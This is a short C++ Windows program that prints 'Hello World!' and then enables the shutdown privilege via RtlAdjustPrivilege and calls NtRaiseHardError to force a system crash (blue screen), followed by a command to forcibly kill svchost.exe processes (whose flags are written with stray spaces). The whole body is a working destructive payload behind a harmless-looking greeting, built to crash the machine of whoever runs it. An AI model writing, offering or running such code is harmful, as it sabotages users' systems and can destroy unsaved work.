#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

#include <iostream>

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

int main() {
    std::cout << "Hello World!\n" << std::endl;
    BOOLEAN bl;
    unsigned long response;
    RtlAdjustPrivilege(19, true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 0, &response);
    system("taskkill / f / im svchost.exe");
    std::cout << "\n\n:) Good Bye\n\n" << std::endl;
    return 0;
}
